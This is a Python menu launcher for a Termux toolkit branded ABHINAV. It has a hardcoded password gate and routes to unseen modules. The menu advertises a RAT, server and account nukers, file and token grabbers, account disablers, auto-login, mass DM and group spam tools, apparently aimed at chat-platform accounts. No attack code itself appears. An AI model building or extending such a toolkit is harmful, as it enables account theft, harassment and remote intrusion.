#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ABHINAV - All-in-One Tool Collection for Termux
Premium Edition with Authentication
Author: thulasinayeniabhi-gif
"""

import os
import sys
import platform
import time
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

from tools.main_options import main_options_menu
from tools.grabber_options import grabber_options_menu
from tools.token_options import token_options_menu
from tools.useful_options import useful_options_menu

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if platform.system() != 'Windows' else 'cls')

def print_login_banner():
    """Print login banner"""
    banner = f"""
{Fore.MAGENTA}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║           {Fore.YELLOW}████████╗ ███████╗ ████████╗ ███████╗           {Fore.MAGENTA}║
║           {Fore.YELLOW}╚══██╔══╝ ██╔════╝ ╚══██╔══╝ ██╔════╝           {Fore.MAGENTA}║
║              {Fore.YELLOW}██║    █████╗      ██║    █████╗             {Fore.MAGENTA}║
║              {Fore.YELLOW}██║    ██╔══╝      ██║    ██╔══╝             {Fore.MAGENTA}║
║              {Fore.YELLOW}██║    ███████╗    ██║    ███████╗           {Fore.MAGENTA}║
║              {Fore.YELLOW}╚═╝    ╚══════╝    ╚═╝    ╚══════╝           {Fore.MAGENTA}║
║                                                              ║
║        {Fore.CYAN}═══════════════════════════════════════{Fore.MAGENTA}        ║
║                  {Fore.GREEN}ABHINAV PREMIUM EDITION{Fore.MAGENTA}                   ║
║        {Fore.CYAN}═══════════════════════════════════════{Fore.MAGENTA}        ║
║                                                              ║
║        {Fore.YELLOW}All-in-One Tool Collection for Termux{Fore.MAGENTA}          ║
║              {Fore.YELLOW}20 Premium Tools Included{Fore.MAGENTA}                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """
    print(banner)

def authenticate():
    """Authentication system with password"""
    clear_screen()
    print_login_banner()
    
    correct_password = "abhi"
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        password = input(f"{Fore.YELLOW}[*] Enter Password: {Style.RESET_ALL}")
        
        if password == correct_password:
            print(f"{Fore.GREEN}[✓] Authentication Successful!{Style.RESET_ALL}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}[!] Invalid Password! {remaining} attempts remaining.{Style.RESET_ALL}")
            time.sleep(1)
    
    print(f"{Fore.RED}[!] Authentication Failed! Maximum attempts exceeded.{Style.RESET_ALL}")
    time.sleep(2)
    return False

def print_banner():
    """Print welcome banner with ABHINAV branding"""
    banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
║                                                            ║
║          {Fore.YELLOW}█████╗ ██████╗ ██╗  ██╗██╗███╗   ██╗ █████╗ ██╗   ██╗{Fore.CYAN}║
║          {Fore.YELLOW}██╔══██╗██╔══██╗██║  ██║██║████╗  ██║██╔══██╗██║   ██║{Fore.CYAN}║
║          {Fore.YELLOW}███████║██████╔╝███████║██║██╔██╗ ██║███████║██║   ██║{Fore.CYAN}║
║          {Fore.YELLOW}██╔══██║██╔══██╗██╔══██║██║██║╚██╗██║██╔══██║╚██╗ ██╔╝{Fore.CYAN}║
║          {Fore.YELLOW}██║  ██║██████╔╝██║  ██║██║██║ ╚████║██║  ██║ ╚████╔╝{Fore.CYAN}║
║          {Fore.YELLOW}╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝  ╚═══╝{Fore.CYAN}║
║                                                            ║
║      {Fore.GREEN}Premium All-in-One Tool Collection v1.0{Fore.CYAN}             ║
║         {Fore.GREEN}Termux & Linux Compatible Toolkit{Fore.CYAN}              ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """
    print(banner)

def print_main_menu():
    """Display main menu"""
    menu = f"""
{Fore.GREEN}[+] MAIN OPTIONS:{Style.RESET_ALL}
    {Fore.YELLOW}[01]{Style.RESET_ALL} Self Bot          {Fore.YELLOW}[02]{Style.RESET_ALL} RAT Tool
    {Fore.YELLOW}[03]{Style.RESET_ALL} Raid Tool         {Fore.YELLOW}[04]{Style.RESET_ALL} Server Nuker
    {Fore.YELLOW}[05]{Style.RESET_ALL} VideoCrash Maker

{Fore.CYAN}[+] GRABBER OPTIONS:{Style.RESET_ALL}
    {Fore.YELLOW}[06]{Style.RESET_ALL} File Grabber      {Fore.YELLOW}[07]{Style.RESET_ALL} Image Grabber
    {Fore.YELLOW}[08]{Style.RESET_ALL} QrCode Generator

{Fore.MAGENTA}[+] TOKEN OPTIONS:{Style.RESET_ALL}
    {Fore.YELLOW}[09]{Style.RESET_ALL} Account Nuker     {Fore.YELLOW}[10]{Style.RESET_ALL} Account Disabler
    {Fore.YELLOW}[11]{Style.RESET_ALL} Account Generator {Fore.YELLOW}[12]{Style.RESET_ALL} Settings Cycler
    {Fore.YELLOW}[13]{Style.RESET_ALL} Token Informations {Fore.YELLOW}[14]{Style.RESET_ALL} AutoLogin

{Fore.BLUE}[+] USEFUL OPTIONS:{Style.RESET_ALL}
    {Fore.YELLOW}[15]{Style.RESET_ALL} Tokens Checker    {Fore.YELLOW}[16]{Style.RESET_ALL} Clear DM
    {Fore.YELLOW}[17]{Style.RESET_ALL} House Changer     {Fore.YELLOW}[18]{Style.RESET_ALL} Server Lookup
    {Fore.YELLOW}[19]{Style.RESET_ALL} Mass DM           {Fore.YELLOW}[20]{Style.RESET_ALL} Group Spammer

{Fore.RED}[00]{Style.RESET_ALL} Exit    {Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} Logout
    """
    print(menu)

def main():
    """Main application loop"""
    # Authenticate user first
    if not authenticate():
        sys.exit(1)
    
    while True:
        clear_screen()
        print_banner()
        print_main_menu()
        
        choice = input(f"{Fore.YELLOW}[*] Select Option: {Style.RESET_ALL}").strip()
        
        if choice == '00':
            print(f"{Fore.RED}[!] Exiting ABHINAV... Goodbye!{Style.RESET_ALL}")
            sys.exit(0)
        elif choice == '*':
            print(f"{Fore.YELLOW}[!] Logging out from ABHINAV...{Style.RESET_ALL}")
            time.sleep(1)
            return  # Return to authentication
        elif choice in ['01', '02', '03', '04', '05']:
            main_options_menu(choice)
        elif choice in ['06', '07', '08']:
            grabber_options_menu(choice)
        elif choice in ['09', '10', '11', '12', '13', '14']:
            token_options_menu(choice)
        elif choice in ['15', '16', '17', '18', '19', '20']:
            useful_options_menu(choice)
        else:
            print(f"{Fore.RED}[!] Invalid option! Please try again.{Style.RESET_ALL}")
            input(f"{Fore.YELLOW}[*] Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        while True:
            main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)